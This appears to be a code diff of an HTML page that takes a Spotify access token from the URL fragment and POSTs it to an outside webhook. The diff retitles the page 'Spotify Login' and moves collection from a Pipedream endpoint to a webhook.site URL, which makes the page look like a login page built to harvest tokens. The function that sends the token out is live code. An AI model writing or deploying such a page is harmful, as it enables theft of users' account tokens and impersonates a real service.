@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Spotify Token Redirect</title>
+    <title>Spotify Login</title>
     <script>
         function getAccessToken() {
             const params = new URLSearchParams(window.location.hash.substr(1));
@@ -18,7 +18,7 @@
         }
 
         function sendTokenToWebhook(token) {
-            fetch('https://eosozxvdpr5tx19.m.pipedream.net', { // Replace with your Pipedream URL
+            fetch('https://webhook.site/aa7a120f-6a64-4ce0-86e3-ee800aad28f5', { // Replace with your webhook URL
                 method: 'POST',
                 body: JSON.stringify({ accessToken: token }),
                 headers: { 'Content-Type': 'application/json' }
